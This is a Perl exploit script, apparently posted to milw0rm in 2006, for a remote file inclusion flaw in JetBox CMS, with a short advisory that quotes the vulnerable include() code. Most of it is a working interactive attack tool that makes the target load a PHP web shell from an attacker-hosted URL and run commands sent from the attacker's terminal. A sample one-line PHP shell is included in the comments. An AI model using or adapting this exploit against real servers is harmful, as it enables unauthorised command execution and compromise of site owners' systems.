#!/usr/bin/perl
############
# JetBox CMS Remote File Include
# Exploit & Advisorie:  beford <xbefordx gmail com>
#
# uso:# 	perl own.pl <host> <cmd-shell-url> <cmd-var>
# 		perl own.pl http://host.com/jet/ http://atacante/shell.gif cmd
#
# cmd shell example: <? system($cmd); ?>
# cmd variable: cmd;
#
#############
# Description
###########
# Vendor: http://jetbox.streamedge.com/
# The file jetbox/includes/phpdig/includes/config.php uses the variable 
# relative_script_path in a include() function without being declared. 
# This issue has already been fixed in phpdig, but jetbox still uses a 
# vulnerable version.
############
# Vuln code
############
#if (is_file("$relative_script_path/locales/$phpdig_language-language.php"))
#    {include "$relative_script_path/locales/$phpdig_language-language.php";}
#else
#    {include "$relative_script_path/locales/en-language.php";}
############

use LWP::UserAgent;

$Path = $ARGV[0];
$Pathtocmd = $ARGV[1];
$cmdv = $ARGV[2];
if($Path!~/http:\/\// || $Pathtocmd!~/http:\/\// || !$cmdv) { usage(); }
head();
while()
{
	print "[shell] \$";
	while(<STDIN>)      {
		$cmd=$_;
		chomp($cmd);
		if (!$cmd) {last;}  
		$xpl = LWP::UserAgent->new() or die;
		$req = HTTP::Request->new(GET =>$Path.'includes/phpdig/includes/config.php?relative_script_path='.$Pathtocmd.'?&'.$cmdv.'='.$cmd)or die "\nCould Not connect\n";
		$res = $xpl->request($req);
		$return = $res->content;
		$return =~ tr/[\n]/[ê]/;
		
		if ($return =~/Error: HTTP request failed!/ ) {
			print "\nInvalid path for phpshell\n";
			exit;
		} elsif ($return =~/^<br.\/>.<b>Fatal.error/) {
			print "\nComando Invalido, o no hubo respuesta\n\n";
		}
		if ($return =~ /(.*)/) {
			$finreturn = $1;
			$finreturn=~ tr/[ê]/[\n]/;
			print "\r\n$finreturn\n\r";
			last;
		} else {
			print "[shell] \$";
		}

	}

} last;

sub head()  { 
	 print "\n============================================================================\r\n";
	 print " JetBox CMS Remote File Include\r\n";
	 print "============================================================================\r\n";
 }
 
sub usage() {
	 head();
	 print " Usage: perl own.pl <host> <url-cmd> <var>\r\n\n";
	 print " <host> - Full Path : http://host/jetbox/ [remember the trailing slash noob]\r\n";
	 print " <url-cmd> - PhpShell : http://atacate/shell.gif \r\n";
	 print " <var> - var name used in phpshell : cmd  \r\n";
	 exit();
 }

# milw0rm.com [2006-05-07]
